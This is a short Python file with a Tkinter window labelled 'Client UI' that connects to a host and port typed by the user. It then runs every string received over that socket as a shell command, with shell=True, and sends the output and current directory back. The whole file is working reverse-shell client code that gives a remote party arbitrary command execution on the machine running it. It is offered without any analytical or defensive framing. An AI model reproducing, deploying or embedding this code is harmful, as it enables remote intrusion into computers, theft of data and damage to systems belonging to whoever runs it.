import socket
import os
import subprocess
from tkinter import *


def main_body():
    s =  socket.socket()
    host = host_form.get()
    port = port_form.get()
    s.connect((host,port))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0 :
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + ">"

            s.send(str.encode(output_str+currentWD))

            print(output_str)

screen=Tk()
screen.geometry("300x200")
screen.title("Client UI")

host_form = StringVar()
port_form = IntVar()

host_text=Label(text="Host")
port_text=Label(text="Port")

host_entry=Entry(textvariable=host_form, width="30")
port_entry=Entry(textvariable=port_form, width="30")

host_text.place(x=15,y=10)
host_entry.place(x=50,y=10)
port_text.place(x=15,y=40)
port_entry.place(x=50,y=40)
connect = Button(screen,text="Connect", width="30",height="2",command=main_body,bg="grey")
connect.place(x=15,y=70)

screen.mainloop()